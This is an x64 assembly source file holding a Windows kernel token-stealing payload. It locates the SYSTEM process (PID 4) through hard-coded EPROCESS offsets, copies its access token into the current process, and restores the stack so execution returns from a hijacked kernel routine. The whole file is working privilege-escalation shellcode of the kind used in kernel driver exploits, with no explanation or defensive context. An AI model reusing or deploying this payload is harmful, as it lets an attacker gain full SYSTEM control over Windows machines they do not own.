PUBLIC GetSystemToken
.CODE
GetSystemToken PROC

mov  rdx, gs:[188h]			
mov  r8, [rdx + 0b8h]
mov  r9, [r8 + 2e8h]
mov  rcx, [r9]

find_system_proc:
mov  rdx, [rcx - 8h]
cmp  rdx, 4h
jz   found_system
mov  rcx, [rcx]
jmp  find_system_proc

found_system:
mov  rax, [rcx + 070h]
and  al, 0f0h
mov  [r8 + 358h], rax

xor  rax, rax
xor  rsi, rsi
xor  rdi, rdi

add  rsp, 040h
ret

GetSystemToken ENDP

END